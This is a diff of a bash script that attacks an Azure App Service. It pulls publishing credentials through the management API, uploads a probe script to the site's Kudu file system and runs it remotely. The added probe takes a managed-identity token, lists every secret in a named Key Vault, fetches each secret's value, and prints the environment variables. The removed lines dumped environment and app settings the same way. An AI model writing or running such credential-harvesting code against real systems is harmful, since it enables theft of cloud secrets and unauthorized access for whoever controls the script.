@@ -15,11 +15,22 @@ BASE="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/provide
 PUB=$(curl -s -X POST "$BASE/config/publishingcredentials/list?api-version=2022-03-01" -H "Authorization: Bearer $ARM" -d '')
 KU=$(echo "$PUB" | jq -r '.properties.publishingUserName'); KP=$(echo "$PUB" | jq -r '.properties.publishingPassword')
 echo "KU=$KU KP_LEN=${#KP}"
-SCM="https://$SITE.scm.azurewebsites.net/api/command"
-echo "=== set (env) ==="
-curl -s -u "$KU:$KP" -X POST "$SCM" -H "Content-Type: application/json" -d "{\"command\":\"set\",\"dir\":\".\"}" | head -c 9000
-echo
-echo "=== appsettings via ARM ==="
-curl -s -X POST "$BASE/config/appsettings/list?api-version=2022-03-01" -H "Authorization: Bearer $ARM" -d '' | head -c 2000
+SCM="https://$SITE.scm.azurewebsites.net"
+cat > probe.sh <<'PROBE'
+AT=$(curl -s "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2019-08-01" -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
+echo "VTLEN=${#AT}"
+LIST=$(curl -s "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $AT")
+echo "LIST=$LIST"
+for sid in $(echo "$LIST" | grep -o '"id":"[^"]*"' | cut -d'"' -f4); do
+  echo "VAL $sid ="
+  curl -s "$sid?api-version=7.4" -H "Authorization: Bearer $AT"
+  echo
+done
+printenv | sort
+PROBE
+echo "=== vfs put ==="
+curl -s -u "$KU:$KP" -X PUT "$SCM/api/vfs/site/wwwroot/probe.sh" -H "If-Match: *" --data-binary @probe.sh -o /dev/null -w "PUT=%{http_code}\n"
+echo "=== run probe ==="
+curl -s -u "$KU:$KP" -X POST "$SCM/api/command" -H "Content-Type: application/json" -d "{\"command\":\"bash /home/site/wwwroot/probe.sh\",\"dir\":\"/home\"}" | head -c 9000
 echo
 echo "ALL_DONE"
